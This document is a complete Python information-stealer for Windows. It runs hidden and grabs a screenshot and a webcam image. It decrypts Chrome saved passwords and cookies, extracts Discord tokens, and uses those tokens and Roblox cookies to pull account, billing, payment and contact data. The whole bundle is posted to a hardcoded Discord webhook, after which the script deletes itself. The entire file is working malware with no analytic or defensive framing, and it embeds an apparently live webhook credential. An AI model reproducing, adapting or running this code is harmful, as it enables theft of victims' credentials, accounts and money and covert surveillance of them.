import os
import sys
import requests
import socket
import platform
import getpass
import json
import base64
import time
from datetime import datetime
import hashlib
import subprocess
import tempfile
from io import BytesIO
import ctypes
import winreg
import threading
import re
import sqlite3
import shutil
import struct
import ctypes.wintypes

# === CONFIGURATION ===
WEBHOOK_URL = "https://discord.com/api/webhooks/1446737966616547429/tnrCpgYUsP5RjkWocLk_EnQmwjEfEA6vXCPRCtwe80N595UkJRSqF5SZxvNk6ML3tsP6"
CAPTURE_SCREENSHOT = True
CAPTURE_WEBCAM = True
DELETE_AFTER_SEND = True
USE_SSL_VERIFY = False
SILENT_MODE = True

# Redirect all output to null
if SILENT_MODE:
    class NullWriter:
        def write(self, text):
            pass
        def flush(self):
            pass
    sys.stdout = NullWriter()
    sys.stderr = NullWriter()

# Try imports silently
PIL_AVAILABLE = False
CV2_AVAILABLE = False

try:
    from PIL import ImageGrab, Image
    PIL_AVAILABLE = True
except:
    CAPTURE_SCREENSHOT = False

try:
    import cv2
    CV2_AVAILABLE = True
except:
    CAPTURE_WEBCAM = False

def get_system_info():
    """Get precise system information"""
    info = {}
    
    try:
        info["hostname"] = socket.gethostname()
    except:
        info["hostname"] = "Unknown"
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["local_ip"] = s.getsockname()[0]
        s.close()
    except:
        info["local_ip"] = "Unknown"
    
    info["platform"] = platform.platform()
    info["system"] = platform.system()
    info["release"] = platform.release()
    info["version"] = platform.version()
    info["machine"] = platform.machine()
    info["processor"] = platform.processor()
    info["username"] = getpass.getuser()
    info["python_version"] = platform.python_version()
    info["timestamp"] = datetime.now().isoformat()
    info["computer_name"] = os.getenv('COMPUTERNAME', os.getenv('HOSTNAME', 'Unknown'))
    info["user_profile"] = os.path.expanduser("~")
    
    return info

def get_public_ip():
    services = ['http://api.ipify.org', 'http://ipv4.icanhazip.com']
    for service in services:
        try:
            response = requests.get(service, timeout=3, verify=USE_SSL_VERIFY)
            if response.status_code == 200:
                return response.text.strip()
        except:
            continue
    return "Unknown"

def get_network_info():
    info = {}
    try:
        response = requests.get('http://ip-api.com/json/', timeout=5, verify=USE_SSL_VERIFY)
        if response.status_code == 200:
            ip_info = response.json()
            if ip_info.get('status') == 'success':
                info.update({
                    "country": ip_info.get('country'),
                    "country_code": ip_info.get('countryCode'),
                    "region": ip_info.get('regionName'),
                    "city": ip_info.get('city'),
                    "zip": ip_info.get('zip'),
                    "lat": ip_info.get('lat'),
                    "lon": ip_info.get('lon'),
                    "timezone": ip_info.get('timezone'),
                    "isp": ip_info.get('isp'),
                    "org": ip_info.get('org'),
                    "asn": ip_info.get('as')
                })
    except:
        pass
    return info

def capture_screenshot():
    if not PIL_AVAILABLE or not CAPTURE_SCREENSHOT:
        return None
    try:
        screenshot = ImageGrab.grab()
        if screenshot.mode != 'RGB':
            screenshot = screenshot.convert('RGB')
        img_bytes = BytesIO()
        screenshot.save(img_bytes, format='JPEG', quality=85)
        return base64.b64encode(img_bytes.getvalue()).decode('utf-8')
    except:
        return None

def capture_webcam():
    if not CV2_AVAILABLE or not CAPTURE_WEBCAM:
        return None
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        if ret:
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame_rgb)
            img_bytes = BytesIO()
            img.save(img_bytes, format='JPEG', quality=85)
            cap.release()
            cv2.destroyAllWindows()
            return base64.b64encode(img_bytes.getvalue()).decode('utf-8')
        cap.release()
        cv2.destroyAllWindows()
        return None
    except:
        return None

def get_master_key():
    """Get Chrome master key for decryption"""
    try:
        local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 
                                       'Google', 'Chrome', 'User Data', 'Local State')
        if os.path.exists(local_state_path):
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
            
            # Decrypt with DPAPI
            import ctypes
            import ctypes.wintypes
            
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [('cbData', ctypes.wintypes.DWORD),
                           ('pbData', ctypes.POINTER(ctypes.c_char))]
            
            blob = DATA_BLOB()
            blob.pbData = ctypes.c_char_p(encrypted_key)
            blob.cbData = len(encrypted_key)
            
            out_blob = DATA_BLOB()
            result = ctypes.windll.crypt32.CryptUnprotectData(
                ctypes.byref(blob), None, None, None, None, 0, ctypes.byref(out_blob)
            )
            
            if result:
                decrypted = ctypes.string_at(out_blob.pbData, out_blob.cbData)
                ctypes.windll.kernel32.LocalFree(out_blob.pbData)
                return decrypted
    except:
        pass
    return None

def decrypt_password(encrypted_password, master_key):
    """Decrypt Chrome password"""
    try:
        if encrypted_password[:3] == b'v10':
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            
            from Crypto.Cipher import AES
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16]
            return decrypted.decode('utf-8', errors='ignore')
    except:
        pass
    return "[ENCRYPTED]"

def extract_browser_data():
    """Extract browser data with precision"""
    browser_data = {
        "chrome": {
            "passwords": [],
            "cookies": [],
            "history": []
        }
    }
    
    if platform.system() != "Windows":
        return browser_data
    
    chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default')
    master_key = get_master_key()
    
    if os.path.exists(chrome_path):
        # Extract passwords
        login_file = os.path.join(chrome_path, 'Login Data')
        if os.path.exists(login_file):
            try:
                temp_db = os.path.join(tempfile.gettempdir(), 'chrome_passwords.db')
                shutil.copy2(login_file, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for url, username, encrypted_password in cursor.fetchall():
                    password = "[ENCRYPTED]"
                    if master_key and encrypted_password:
                        password = decrypt_password(encrypted_password, master_key)
                    
                    browser_data["chrome"]["passwords"].append({
                        "url": url,
                        "username": username,
                        "password": password
                    })
                
                conn.close()
                os.remove(temp_db)
            except:
                pass
        
        # Extract cookies
        cookies_file = os.path.join(chrome_path, 'Cookies')
        if os.path.exists(cookies_file):
            try:
                temp_db = os.path.join(tempfile.gettempdir(), 'chrome_cookies.db')
                shutil.copy2(cookies_file, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT host_key, name, encrypted_value 
                    FROM cookies 
                    WHERE host_key LIKE '%discord%' OR host_key LIKE '%roblox%'
                    ORDER BY last_access_utc DESC
                """)
                
                for host, name, encrypted_value in cursor.fetchall():
                    value = "[ENCRYPTED]"
                    if master_key and encrypted_value:
                        value = decrypt_password(encrypted_value, master_key)
                    
                    browser_data["chrome"]["cookies"].append({
                        "host": host,
                        "name": name,
                        "value": value[:500]  # Truncate long values
                    })
                
                conn.close()
                os.remove(temp_db)
            except:
                pass
        
        # Extract history
        history_file = os.path.join(chrome_path, 'History')
        if os.path.exists(history_file):
            try:
                temp_db = os.path.join(tempfile.gettempdir(), 'chrome_history.db')
                shutil.copy2(history_file, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
                
                for url, title, visits, last_visit in cursor.fetchall():
                    browser_data["chrome"]["history"].append({
                        "url": url,
                        "title": title,
                        "visits": visits,
                        "last_visit": last_visit
                    })
                
                conn.close()
                os.remove(temp_db)
            except:
                pass
    
    return browser_data

def extract_discord_tokens():
    """Extract Discord tokens with precision"""
    tokens = []
    
    if platform.system() == "Windows":
        discord_paths = [
            os.path.join(os.getenv('LOCALAPPDATA'), 'Discord'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'DiscordCanary'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'DiscordPTB'),
        ]
        
        for discord_path in discord_paths:
            if os.path.exists(discord_path):
                storage_path = os.path.join(discord_path, 'Local Storage', 'leveldb')
                if os.path.exists(storage_path):
                    try:
                        for root, dirs, files in os.walk(storage_path):
                            for file in files:
                                if file.endswith('.ldb') or file.endswith('.log'):
                                    filepath = os.path.join(root, file)
                                    try:
                                        with open(filepath, 'r', errors='ignore', encoding='utf-8') as f:
                                            content = f.read()
                                            
                                            patterns = [
                                                r'mfa\.[\w-]{84}',
                                                r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
                                                r'[\w-]{26}\.[\w-]{6}\.[\w-]{38}',
                                                r'[\w-]{59}\.[\w-]{6}\.[\w-]{27}',
                                            ]
                                            
                                            for pattern in patterns:
                                                matches = re.findall(pattern, content)
                                                tokens.extend(matches)
                                    except:
                                        continue
                    except:
                        pass
    
    return list(set(tokens))

def get_discord_account_info(token):
    """Get precise Discord account information"""
    account_info = {
        "token": token,
        "account": {},
        "friends": [],
        "servers": [],
        "dm_channels": []
    }
    
    if not token:
        return account_info
    
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0'
    }
    
    try:
        # Get account details
        response = requests.get('https://discord.com/api/v9/users/@me', 
                              headers=headers, timeout=10, verify=USE_SSL_VERIFY)
        
        if response.status_code == 200:
            user_data = response.json()
            account_info["account"] = {
                "id": user_data.get('id'),
                "username": user_data.get('username'),
                "discriminator": user_data.get('discriminator'),
                "global_name": user_data.get('global_name'),
                "email": user_data.get('email'),
                "phone": user_data.get('phone'),
                "verified": user_data.get('verified'),
                "mfa_enabled": user_data.get('mfa_enabled'),
                "premium_type": user_data.get('premium_type'),
                "locale": user_data.get('locale'),
                "nsfw_allowed": user_data.get('nsfw_allowed'),
                "flags": user_data.get('flags'),
                "public_flags": user_data.get('public_flags'),
                "bio": user_data.get('bio'),
                "avatar": user_data.get('avatar'),
                "banner": user_data.get('banner'),
                "accent_color": user_data.get('accent_color')
            }
            
            # Get billing info
            try:
                billing_response = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources',
                                              headers=headers, timeout=10, verify=USE_SSL_VERIFY)
                if billing_response.status_code == 200:
                    account_info["billing"] = billing_response.json()
            except:
                pass
            
            # Get friends
            try:
                friends_response = requests.get('https://discord.com/api/v9/users/@me/relationships',
                                               headers=headers, timeout=10, verify=USE_SSL_VERIFY)
                if friends_response.status_code == 200:
                    account_info["friends"] = friends_response.json()
            except:
                pass
            
            # Get servers
            try:
                guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds',
                                              headers=headers, timeout=10, verify=USE_SSL_VERIFY)
                if guilds_response.status_code == 200:
                    account_info["servers"] = guilds_response.json()
            except:
                pass
            
            # Get DM channels
            try:
                dms_response = requests.get('https://discord.com/api/v9/users/@me/channels',
                                           headers=headers, timeout=10, verify=USE_SSL_VERIFY)
                if dms_response.status_code == 200:
                    account_info["dm_channels"] = dms_response.json()
            except:
                pass
            
            # Get connections (Spotify, YouTube, etc.)
            try:
                connections_response = requests.get('https://discord.com/api/v9/users/@me/connections',
                                                   headers=headers, timeout=10, verify=USE_SSL_VERIFY)
                if connections_response.status_code == 200:
                    account_info["connections"] = connections_response.json()
            except:
                pass
            
            # Get nitro subscriptions
            try:
                nitro_response = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions',
                                            headers=headers, timeout=10, verify=USE_SSL_VERIFY)
                if nitro_response.status_code == 200:
                    account_info["subscriptions"] = nitro_response.json()
            except:
                pass
    except:
        pass
    
    return account_info

def extract_roblox_cookies():
    """Extract Roblox cookies with precision"""
    roblox_cookies = []
    
    browser_data = extract_browser_data()
    for cookie in browser_data["chrome"]["cookies"]:
        if 'roblox.com' in cookie["host"]:
            roblox_cookies.append(cookie)
    
    return roblox_cookies

def get_roblox_account_info(roblox_cookie):
    """Get precise Roblox account information using cookie"""
    if not roblox_cookie or roblox_cookie["value"] == "[ENCRYPTED]":
        return None
    
    account_info = {
        "cookie": roblox_cookie["value"][:100] + "..." if len(roblox_cookie["value"]) > 100 else roblox_cookie["value"],
        "account": {}
    }
    
    try:
        headers = {
            'Cookie': f'.ROBLOSECURITY={roblox_cookie["value"]}',
            'User-Agent': 'Mozilla/5.0',
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        }
        
        # Get basic user info
        user_response = requests.get('https://users.roblox.com/v1/users/authenticated',
                                   headers=headers, timeout=10, verify=USE_SSL_VERIFY)
        
        if user_response.status_code == 200:
            user_data = user_response.json()
            account_info["account"].update({
                "id": user_data.get('id'),
                "name": user_data.get('name'),
                "displayName": user_data.get('displayName'),
                "description": user_data.get('description'),
                "created": user_data.get('created'),
                "isBanned": user_data.get('isBanned'),
                "hasVerifiedBadge": user_data.get('hasVerifiedBadge')
            })
        
        # Get economy/robux info
        economy_response = requests.get('https://economy.roblox.com/v1/user/currency',
                                      headers=headers, timeout=10, verify=USE_SSL_VERIFY)
        
        if economy_response.status_code == 200:
            economy_data = economy_response.json()
            account_info["account"]["robux"] = economy_data.get('robux', 0)
        
        # Get premium status
        premium_response = requests.get('https://premiumfeatures.roblox.com/v1/users/premium/membership',
                                      headers=headers, timeout=10, verify=USE_SSL_VERIFY)
        
        if premium_response.status_code == 200:
            premium_data = premium_response.json()
            account_info["account"]["premium"] = premium_data
        
        # Get inventory counts
        inventory_response = requests.get('https://inventory.roblox.com/v1/users/inventory/counts',
                                        headers=headers, timeout=10, verify=USE_SSL_VERIFY)
        
        if inventory_response.status_code == 200:
            inventory_data = inventory_response.json()
            account_info["account"]["inventory"] = {
                "assets": inventory_data.get('assets', 0),
                "collectibles": inventory_data.get('collectibles', 0),
                "limiteds": inventory_data.get('limiteds', 0)
            }
        
        # Get trade stats
        trade_response = requests.get('https://trades.roblox.com/v1/trades/counts',
                                    headers=headers, timeout=10, verify=USE_SSL_VERIFY)
        
        if trade_response.status_code == 200:
            trade_data = trade_response.json()
            account_info["account"]["trade_stats"] = {
                "inbound": trade_data.get('inboundCount', 0),
                "outbound": trade_data.get('outboundCount', 0),
                "completed": trade_data.get('completedCount', 0)
            }
        
        # Get friends count
        friends_response = requests.get('https://friends.roblox.com/v1/my/friends/count',
                                      headers=headers, timeout=10, verify=USE_SSL_VERIFY)
        
        if friends_response.status_code == 200:
            friends_data = friends_response.json()
            account_info["account"]["friends_count"] = friends_data.get('count', 0)
        
        # Get groups info
        groups_response = requests.get('https://groups.roblox.com/v1/users/groups/roles',
                                     headers=headers, timeout=10, verify=USE_SSL_VERIFY)
        
        if groups_response.status_code == 200:
            groups_data = groups_response.json()
            account_info["account"]["groups"] = groups_data.get('data', [])
        
        # Get email info (if available)
        email_response = requests.get('https://accountinformation.roblox.com/v1/email',
                                    headers=headers, timeout=10, verify=USE_SSL_VERIFY)
        
        if email_response.status_code == 200:
            email_data = email_response.json()
            account_info["account"]["email"] = {
                "address": email_data.get('emailAddress'),
                "verified": email_data.get('verified')
            }
        
        # Get phone info (if available)
        phone_response = requests.get('https://accountinformation.roblox.com/v1/phone',
                                    headers=headers, timeout=10, verify=USE_SSL_VERIFY)
        
        if phone_response.status_code == 200:
            phone_data = phone_response.json()
            account_info["account"]["phone"] = {
                "number": phone_data.get('phoneNumber'),
                "verified": phone_data.get('verified')
            }
        
        # Get 2FA status
        try:
            twofa_response = requests.get('https://twostepverification.roblox.com/v1/metadata',
                                        headers=headers, timeout=10, verify=USE_SSL_VERIFY)
            if twofa_response.status_code == 200:
                twofa_data = twofa_response.json()
                account_info["account"]["2fa"] = {
                    "enabled": twofa_data.get('twoStepVerificationEnabled'),
                    "type": twofa_data.get('twoStepVerificationType')
                }
        except:
            pass
        
        # Get privacy settings
        privacy_response = requests.get('https://accountsettings.roblox.com/v1/privacy',
                                      headers=headers, timeout=10, verify=USE_SSL_VERIFY)
        
        if privacy_response.status_code == 200:
            privacy_data = privacy_response.json()
            account_info["account"]["privacy"] = privacy_data
        
        # Get credit balance
        credit_response = requests.get('https://billing.roblox.com/v1/credit',
                                     headers=headers, timeout=10, verify=USE_SSL_VERIFY)
        
        if credit_response.status_code == 200:
            credit_data = credit_response.json()
            account_info["account"]["credit_balance"] = credit_data.get('balance', 0)
        
        # Get saved payment methods
        payments_response = requests.get('https://billing.roblox.com/v1/payment-methods',
                                       headers=headers, timeout=10, verify=USE_SSL_VERIFY)
        
        if payments_response.status_code == 200:
            payments_data = payments_response.json()
            account_info["account"]["payment_methods"] = payments_data
        
    except Exception as e:
        account_info["error"] = str(e)
    
    return account_info

def collect_all_data():
    """Collect all data into a single precise structure"""
    all_data = {
        "metadata": {
            "collection_time": datetime.now().isoformat(),
            "collection_tool": "System Intelligence Collector v2.0"
        },
        "system": get_system_info(),
        "network": {
            "public_ip": get_public_ip(),
            "geolocation": get_network_info()
        },
        "media": {
            "screenshot": capture_screenshot(),
            "webcam": capture_webcam()
        },
        "browser": extract_browser_data(),
        "discord": {
            "tokens_found": [],
            "accounts": []
        },
        "roblox": {
            "cookies_found": [],
            "accounts": []
        }
    }
    
    # Discord data
    discord_tokens = extract_discord_tokens()
    all_data["discord"]["tokens_found"] = discord_tokens
    
    for token in discord_tokens:
        account_info = get_discord_account_info(token)
        all_data["discord"]["accounts"].append(account_info)
    
    # Roblox data
    roblox_cookies = extract_roblox_cookies()
    all_data["roblox"]["cookies_found"] = [c["value"][:50] + "..." if len(c["value"]) > 50 else c["value"] 
                                          for c in roblox_cookies]
    
    for cookie in roblox_cookies:
        if cookie["value"] != "[ENCRYPTED]":
            account_info = get_roblox_account_info(cookie)
            if account_info:
                all_data["roblox"]["accounts"].append(account_info)
    
    # Add browser passwords summary
    browser_passwords = all_data["browser"]["chrome"]["passwords"]
    all_data["browser"]["summary"] = {
        "total_passwords": len(browser_passwords),
        "discord_related": len([p for p in browser_passwords if 'discord' in p["url"].lower()]),
        "roblox_related": len([p for p in browser_passwords if 'roblox' in p["url"].lower()]),
        "email_accounts": len([p for p in browser_passwords if '@' in p["username"]]),
        "unique_domains": len(set([p["url"].split('/')[2] if len(p["url"].split('/')) > 2 else p["url"] 
                                  for p in browser_passwords]))
    }
    
    # Calculate data size
    json_str = json.dumps(all_data, ensure_ascii=False)
    all_data["metadata"]["data_size_bytes"] = len(json_str.encode('utf-8'))
    all_data["metadata"]["estimated_discord_messages"] = (len(json_str) // 1900) + 1
    
    return all_data

def send_json_file(webhook_url, data):
    """Send the complete JSON file to Discord"""
    try:
        # Create JSON file
        json_str = json.dumps(data, indent=2, ensure_ascii=False)
        filename = f"system_intelligence_{data['system']['username']}_{int(time.time())}.json"
        
        # Create summary message
        summary = f"""
**🔍 SYSTEM INTELLIGENCE REPORT - COMPLETE DATA**

**👤 Target:** `{data['system']['username']}@{data['system']['hostname']}`
**🌐 IP Address:** `{data['network']['public_ip']}`
**📍 Location:** {data['network']['geolocation'].get('city', 'Unknown')}, {data['network']['geolocation'].get('country', 'Unknown')}
**🕐 Collection Time:** {data['metadata']['collection_time']}

**📊 DATA SUMMARY:**
• **Discord Tokens Found:** {len(data['discord']['tokens_found'])}
• **Roblox Accounts Found:** {len(data['roblox']['accounts'])}
• **Browser Passwords:** {data['browser']['summary']['total_passwords']}
• **Browser Cookies:** {len(data['browser']['chrome']['cookies'])}
• **Browser History Entries:** {len(data['browser']['chrome']['history'])}
• **Total Data Size:** {data['metadata']['data_size_bytes']:,} bytes

**📁 Complete JSON file attached below with all details including:**
- Full Discord tokens & account information
- Roblox cookies & detailed account stats
- Browser passwords, cookies, history
- System information & network details
- Screenshot & webcam capture (if enabled)

*Use a JSON viewer for detailed analysis.*
        """
        
        # Send with file
        files = {
            'file': (filename, json_str.encode('utf-8'), 'application/json')
        }
        
        payload = {
            'payload_json': json.dumps({
                "content": summary,
                "username": "System Intelligence",
                "avatar_url": "https://cdn.discordapp.com/emojis/851461703487356938.png"
            })
        }
        
        response = requests.post(webhook_url, files=files, data=payload, timeout=30, verify=False)
        return response.status_code in [200, 204]
        
    except Exception as e:
        return False

def hide_window():
    if platform.system() == "Windows":
        try:
            kernel32 = ctypes.WinDLL('kernel32')
            user32 = ctypes.WinDLL('user32')
            hwnd = kernel32.GetConsoleWindow()
            if hwnd:
                user32.ShowWindow(hwnd, 0)
        except:
            pass

def self_delete():
    if not DELETE_AFTER_SEND:
        return
    
    try:
        script_path = os.path.abspath(sys.argv[0])
        
        if platform.system() == "Windows":
            bat_content = f'''
            @echo off
            timeout /t 3 /nobreak >nul
            del /f /q "{script_path}" >nul 2>&1
            if exist "{script_path}" (
                ping 127.0.0.1 -n 2 >nul
                del /f /q "{script_path}" >nul 2>&1
            )
            del "%~f0" >nul 2>&1
            '''
            
            bat_path = os.path.join(tempfile.gettempdir(), f"cleanup_{int(time.time())}.bat")
            with open(bat_path, 'w') as f:
                f.write(bat_content)
            
            subprocess.Popen(['cmd', '/c', bat_path], 
                           shell=False,
                           stdin=subprocess.DEVNULL,
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL,
                           creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            os.remove(script_path)
    except:
        pass

def main():
    hide_window()
    
    # Collect all data
    all_data = collect_all_data()
    
    # Send as single JSON file
    send_json_file(WEBHOOK_URL, all_data)
    
    # Self delete
    if DELETE_AFTER_SEND:
        delete_thread = threading.Thread(target=self_delete)
        delete_thread.daemon = True
        delete_thread.start()

if __name__ == "__main__":
    try:
        main()
    except:
        pass
    
    os._exit(0)
